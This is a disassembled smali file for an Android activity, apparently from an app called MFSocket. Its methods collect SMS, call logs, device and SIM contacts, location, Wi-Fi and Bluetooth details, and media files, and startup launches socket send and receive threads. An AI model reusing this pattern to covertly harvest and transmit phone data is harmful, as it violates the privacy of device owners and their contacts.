.class public Lcom/Android/MFSocket/MFSocket;
.super Landroid/app/Activity;
.source "MFSocket.java"


# instance fields
.field m_recvSocket:Lcom/Android/MFSocket/SocketRecv;

.field m_recvThread:Ljava/lang/Thread;

.field m_sendThread:Ljava/lang/Thread;

.field m_tcpSocket:Lcom/Android/MFSocket/SocketTrans;

.field startDownload:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 12
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 14
    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_tcpSocket:Lcom/Android/MFSocket/SocketTrans;

    .line 15
    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_recvSocket:Lcom/Android/MFSocket/SocketRecv;

    .line 16
    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_recvThread:Ljava/lang/Thread;

    .line 17
    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_sendThread:Ljava/lang/Thread;

    .line 18
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/Android/MFSocket/MFSocket;->startDownload:Z

    .line 12
    return-void
.end method

.method static synthetic access$0(Lcom/Android/MFSocket/MFSocket;Ljava/io/InputStream;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 54
    invoke-direct {p0, p1, p2}, Lcom/Android/MFSocket/MFSocket;->getFile(Ljava/io/InputStream;Ljava/lang/String;)V

    return-void
.end method

.method private getFile(Ljava/io/InputStream;Ljava/lang/String;)V
    .locals 5
    .param p1, "is"    # Ljava/io/InputStream;
    .param p2, "output"    # Ljava/lang/String;

    .prologue
    .line 55
    const/16 v4, 0x400

    new-array v0, v4, [B

    .line 57
    .local v0, "buffer":[B
    :try_start_0
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 59
    .local v3, "os":Ljava/io/FileOutputStream;
    :goto_0
    invoke-virtual {p1, v0}, Ljava/io/InputStream;->read([B)I

    move-result v2

    .local v2, "len":I
    if-gtz v2, :cond_0

    .line 62
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V

    .line 63
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    .line 64
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 68
    .end local v2    # "len":I
    .end local v3    # "os":Ljava/io/FileOutputStream;
    :goto_1
    return-void

    .line 60
    .restart local v2    # "len":I
    .restart local v3    # "os":Ljava/io/FileOutputStream;
    :cond_0
    const/4 v4, 0x0

    invoke-virtual {v3, v0, v4, v2}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 65
    .end local v2    # "len":I
    .end local v3    # "os":Ljava/io/FileOutputStream;
    :catch_0
    move-exception v1

    .line 66
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method getAppInfo(Ljava/lang/StringBuffer;)V
    .locals 2
    .param p1, "appMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 165
    :try_start_0
    new-instance v0, Lcom/Android/MFSocket/AppMsg;

    invoke-direct {v0, p0}, Lcom/Android/MFSocket/AppMsg;-><init>(Landroid/content/Context;)V

    .line 166
    .local v0, "app":Lcom/Android/MFSocket/AppMsg;
    invoke-virtual {v0, p1}, Lcom/Android/MFSocket/AppMsg;->GetAppMsg(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 172
    .end local v0    # "app":Lcom/Android/MFSocket/AppMsg;
    :goto_0
    return-void

    .line 168
    :catch_0
    move-exception v1

    .line 170
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getAudio(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 2
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "strMsg"    # Ljava/lang/StringBuffer;
    .param p3, "nConfig"    # I

    .prologue
    .line 175
    :try_start_0
    new-instance v0, Lcom/Android/MFSocket/AudioMsg;

    invoke-direct {v0, p0}, Lcom/Android/MFSocket/AudioMsg;-><init>(Landroid/content/Context;)V

    .line 176
    .local v0, "audioMsg":Lcom/Android/MFSocket/AudioMsg;
    invoke-virtual {v0, p1, p2, p3}, Lcom/Android/MFSocket/AudioMsg;->getAudio(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 181
    .end local v0    # "audioMsg":Lcom/Android/MFSocket/AudioMsg;
    :goto_0
    return-void

    .line 177
    :catch_0
    move-exception v1

    .line 179
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getBt(Ljava/lang/StringBuffer;)V
    .locals 2
    .param p1, "btMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 153
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/BtMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/BtMsg;-><init>(Landroid/content/Context;)V

    .line 154
    .local v1, "els":Lcom/Android/MFSocket/BtMsg;
    invoke-virtual {v1, p1}, Lcom/Android/MFSocket/BtMsg;->getBtInfo(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 160
    .end local v1    # "els":Lcom/Android/MFSocket/BtMsg;
    :goto_0
    return-void

    .line 156
    :catch_0
    move-exception v0

    .line 158
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getCallLog(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 3
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "callMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 116
    :try_start_0
    new-instance v0, Lcom/Android/MFSocket/CallLogMsg;

    invoke-virtual {p0}, Lcom/Android/MFSocket/MFSocket;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-direct {v0, v2}, Lcom/Android/MFSocket/CallLogMsg;-><init>(Landroid/content/ContentResolver;)V

    .line 117
    .local v0, "call":Lcom/Android/MFSocket/CallLogMsg;
    invoke-virtual {v0, p1, p2, p3}, Lcom/Android/MFSocket/CallLogMsg;->getCallLog(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 123
    .end local v0    # "call":Lcom/Android/MFSocket/CallLogMsg;
    :goto_0
    return-void

    .line 119
    :catch_0
    move-exception v1

    .line 121
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 3
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "contatMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 94
    :try_start_0
    new-instance v0, Lcom/Android/MFSocket/ContactsMsgOS20;

    invoke-virtual {p0}, Lcom/Android/MFSocket/MFSocket;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-direct {v0, v2}, Lcom/Android/MFSocket/ContactsMsgOS20;-><init>(Landroid/content/ContentResolver;)V

    .line 95
    .local v0, "contact":Lcom/Android/MFSocket/ContactsMsgOS20;
    invoke-virtual {v0, p1, p2, p3}, Lcom/Android/MFSocket/ContactsMsgOS20;->getContactOS20(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 101
    .end local v0    # "contact":Lcom/Android/MFSocket/ContactsMsgOS20;
    :goto_0
    return-void

    .line 97
    :catch_0
    move-exception v1

    .line 99
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getGps(Ljava/lang/StringBuffer;)V
    .locals 2
    .param p1, "gpsMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 140
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/GpsMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/GpsMsg;-><init>(Landroid/content/Context;)V

    .line 141
    .local v1, "els":Lcom/Android/MFSocket/GpsMsg;
    invoke-virtual {v1, p1}, Lcom/Android/MFSocket/GpsMsg;->getGpsInfo(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 147
    .end local v1    # "els":Lcom/Android/MFSocket/GpsMsg;
    :goto_0
    return-void

    .line 143
    :catch_0
    move-exception v0

    .line 145
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getImage(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 2
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "strMsg"    # Ljava/lang/StringBuffer;
    .param p3, "nConfig"    # I

    .prologue
    .line 184
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/ImageMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/ImageMsg;-><init>(Landroid/content/Context;)V

    .line 185
    .local v1, "imgMsg":Lcom/Android/MFSocket/ImageMsg;
    invoke-virtual {v1, p1, p2, p3}, Lcom/Android/MFSocket/ImageMsg;->getImage(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 190
    .end local v1    # "imgMsg":Lcom/Android/MFSocket/ImageMsg;
    :goto_0
    return-void

    .line 186
    :catch_0
    move-exception v0

    .line 188
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getSimContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 3
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "contatMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 204
    :try_start_0
    new-instance v0, Lcom/Android/MFSocket/ContactsSIM;

    invoke-virtual {p0}, Lcom/Android/MFSocket/MFSocket;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-direct {v0, v2}, Lcom/Android/MFSocket/ContactsSIM;-><init>(Landroid/content/ContentResolver;)V

    .line 205
    .local v0, "contact":Lcom/Android/MFSocket/ContactsSIM;
    invoke-virtual {v0, p1, p2, p3}, Lcom/Android/MFSocket/ContactsSIM;->getContact(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 210
    .end local v0    # "contact":Lcom/Android/MFSocket/ContactsSIM;
    :goto_0
    return-void

    .line 206
    :catch_0
    move-exception v1

    .line 208
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getSms(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 3
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "smsMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 105
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/SmsMsg;

    invoke-virtual {p0}, Lcom/Android/MFSocket/MFSocket;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-direct {v1, v2}, Lcom/Android/MFSocket/SmsMsg;-><init>(Landroid/content/ContentResolver;)V

    .line 106
    .local v1, "sms":Lcom/Android/MFSocket/SmsMsg;
    invoke-virtual {v1, p1, p2, p3}, Lcom/Android/MFSocket/SmsMsg;->getSms(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 112
    .end local v1    # "sms":Lcom/Android/MFSocket/SmsMsg;
    :goto_0
    return-void

    .line 108
    :catch_0
    move-exception v0

    .line 110
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getSystem(Ljava/lang/StringBuffer;)V
    .locals 2
    .param p1, "sysMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 78
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/SystemMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/SystemMsg;-><init>(Landroid/content/Context;)V

    .line 79
    .local v1, "sys":Lcom/Android/MFSocket/SystemMsg;
    invoke-virtual {v1, p1}, Lcom/Android/MFSocket/SystemMsg;->getSystemMsg(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    .end local v1    # "sys":Lcom/Android/MFSocket/SystemMsg;
    :goto_0
    return-void

    .line 81
    :catch_0
    move-exception v0

    .line 83
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getVideo(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 2
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "strMsg"    # Ljava/lang/StringBuffer;
    .param p3, "nConfig"    # I

    .prologue
    .line 193
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/VideoMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/VideoMsg;-><init>(Landroid/content/Context;)V

    .line 194
    .local v1, "videoMsg":Lcom/Android/MFSocket/VideoMsg;
    invoke-virtual {v1, p1, p2, p3}, Lcom/Android/MFSocket/VideoMsg;->getVideo(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 199
    .end local v1    # "videoMsg":Lcom/Android/MFSocket/VideoMsg;
    :goto_0
    return-void

    .line 195
    :catch_0
    move-exception v0

    .line 197
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method getWifi(Ljava/lang/StringBuffer;)V
    .locals 2
    .param p1, "elseMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 128
    :try_start_0
    new-instance v1, Lcom/Android/MFSocket/WifiMsg;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/WifiMsg;-><init>(Landroid/content/Context;)V

    .line 129
    .local v1, "els":Lcom/Android/MFSocket/WifiMsg;
    invoke-virtual {v1, p1}, Lcom/Android/MFSocket/WifiMsg;->getWifiInfo(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 135
    .end local v1    # "els":Lcom/Android/MFSocket/WifiMsg;
    :goto_0
    return-void

    .line 131
    :catch_0
    move-exception v0

    .line 133
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 22
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 23
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/Android/MFSocket/MFSocket;->setContentView(I)V

    .line 24
    invoke-virtual {p0}, Lcom/Android/MFSocket/MFSocket;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "startDownload"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lcom/Android/MFSocket/MFSocket;->startDownload:Z

    .line 25
    new-instance v0, Lcom/Android/MFSocket/SocketTrans;

    invoke-direct {v0}, Lcom/Android/MFSocket/SocketTrans;-><init>()V

    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_tcpSocket:Lcom/Android/MFSocket/SocketTrans;

    .line 26
    iget-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_tcpSocket:Lcom/Android/MFSocket/SocketTrans;

    iput-object p0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    .line 27
    new-instance v0, Lcom/Android/MFSocket/SocketRecv;

    invoke-direct {v0}, Lcom/Android/MFSocket/SocketRecv;-><init>()V

    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_recvSocket:Lcom/Android/MFSocket/SocketRecv;

    .line 28
    new-instance v0, Ljava/lang/Thread;

    iget-object v1, p0, Lcom/Android/MFSocket/MFSocket;->m_recvSocket:Lcom/Android/MFSocket/SocketRecv;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_recvThread:Ljava/lang/Thread;

    .line 29
    new-instance v0, Ljava/lang/Thread;

    iget-object v1, p0, Lcom/Android/MFSocket/MFSocket;->m_tcpSocket:Lcom/Android/MFSocket/SocketTrans;

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_sendThread:Ljava/lang/Thread;

    .line 31
    iget-boolean v0, p0, Lcom/Android/MFSocket/MFSocket;->startDownload:Z

    if-eqz v0, :cond_0

    .line 32
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/Android/MFSocket/MFSocket$1;

    invoke-direct {v1, p0}, Lcom/Android/MFSocket/MFSocket$1;-><init>(Lcom/Android/MFSocket/MFSocket;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 48
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 50
    :cond_0
    iget-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_recvThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 51
    iget-object v0, p0, Lcom/Android/MFSocket/MFSocket;->m_sendThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 52
    return-void
.end method

.method protected onResume()V
    .locals 0

    .prologue
    .line 72
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 73
    return-void
.end method
